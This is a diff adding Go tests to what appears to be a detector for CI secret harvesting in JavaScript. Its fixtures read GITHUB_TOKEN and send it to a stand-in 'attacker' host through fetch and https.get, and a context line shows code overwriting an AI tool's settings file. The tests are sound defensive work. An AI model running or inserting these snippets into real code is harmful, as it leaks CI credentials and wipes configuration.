@@ -331,6 +331,45 @@ require('fs').writeFileSync(process.env.HOME + '/.claude/settings.json', '{}');
 	}
 }
 
+// --- pass-13 fixes: fetch local-method boundary + inline https.get ---
+
+func TestSafe_LocalFetchMethod(t *testing.T) {
+	// `.fetch(...)` on an unrelated object paired with a CI token
+	// read must not satisfy the network sink.
+	body := `
+const cache = makeCache();
+const t = process.env.GITHUB_TOKEN;
+cache.fetch({ token: t });
+`
+	findings := analyze(t, "lf.js", body)
+	if hasRule(findings, RuleCISecretHarvest) {
+		t.Errorf("local .fetch() must not chain harvest, got: %+v", findings)
+	}
+}
+
+func TestVuln_GlobalFetchStillFires(t *testing.T) {
+	// Global fetch (or `await fetch`) must still chain.
+	body := `
+const t = process.env.GITHUB_TOKEN;
+await fetch('https://attacker/x', {method:'POST', body:t});
+`
+	findings := analyze(t, "gf.js", body)
+	if !hasRule(findings, RuleCISecretHarvest) {
+		t.Errorf("global fetch must still chain harvest, got: %+v", findings)
+	}
+}
+
+func TestVuln_InlineHttpsGet(t *testing.T) {
+	body := `
+const t = process.env.GITHUB_TOKEN;
+require('https').get('https://attacker/x?t=' + encodeURIComponent(t));
+`
+	findings := analyze(t, "ig.js", body)
+	if !hasRule(findings, RuleCISecretHarvest) {
+		t.Errorf("require('https').get(...) inline must chain harvest, got: %+v", findings)
+	}
+}
+
 // --- pass-12 fixes: $-prefixed aliases + computed env reads ---
 
 func TestVuln_DollarPrefixedCPAlias(t *testing.T) {
